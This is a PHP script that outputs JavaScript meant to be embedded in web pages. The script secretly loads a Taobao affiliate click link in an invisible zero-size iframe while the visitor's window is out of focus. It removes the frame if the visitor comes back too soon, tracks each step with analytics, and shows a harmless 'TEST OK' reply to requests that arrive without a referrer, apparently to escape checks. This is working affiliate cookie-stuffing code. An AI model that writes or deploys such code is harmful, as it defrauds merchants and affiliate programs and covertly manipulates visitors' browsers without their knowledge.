<?php
error_reporting(E_ERROR);

header("Content-type: text/javascript");

$delay = rand(15, 30);
$reffer = $_SERVER['HTTP_REFERER'];
$agent = $_SERVER['HTTP_USER_AGENT'];

if($reffer){
	if(eregi("Firefox", $agent)){
		if($delay > 22){
			echo ok($delay*1000);
		}
	}else{
		echo ok($delay*1000);
	}
}else{
	echo error();
}

function ok($delay){
	return <<<EOF
(function(){
	var isLoaded = 0;
	function set(){
		if(document.getElementById('test_tk')){
			return;
		}
		isLoaded = 1;
		
		var t = document.createElement('iframe');
		t.id = 'test_tk';
		t.width = 0;
		t.height = 0;
		t.frameBorder = 0;
		t.src = 'http://s.click.taobao.com/t_9?temp=s314159s265358s979323s84626433s8327s950s288&quicktodo=56c84c1c26c98c75c2412c3688555222cc22&p=mm_30856599_0_0&l=http%3A%2F%2Fwww.tmall.com%2Fgo%2Frgn%2F1111main-header.php';
		
		if (t.attachEvent){    
			t.attachEvent("onload", function(){        
				isLoaded++;
			});
		} else {    
			t.onload = function(){        
				isLoaded++;
			};
		}

		document.body.appendChild(t);
		
		_gaq  && _gaq.push(['_trackEvent', 'tk', 'loaded']);
	}
	var timeout,
		m_onfocus = function(){
			if(timeout){
				clearTimeout(timeout);
				timeout = 0;
			}
			if(isLoaded < 3){
				var t = document.getElementById('test_tk');
				_gaq  && _gaq.push(['_trackEvent', 'tk', 'loading']);
				if(t){
					document.body.removeChild(t);
					_gaq  && _gaq.push(['_trackEvent', 'tk', 'cancel']);
				}
				isLoaded = 0;
			}
		},
		m_onblur = function(){
			if(!timeout){
				timeout = setTimeout(set, $delay);
			}
		};
		m_onblur();
	//ie
	if(!-[1,]){
		window.document.onfocusin = m_onfocus;
		window.document.onfocusout = m_onblur;
	}else{
		window.onfocus = m_onfocus;
		window.onblur = m_onblur;
	}

})();
EOF;
}
function error(){
	return '/*TEST OK!*/';
}
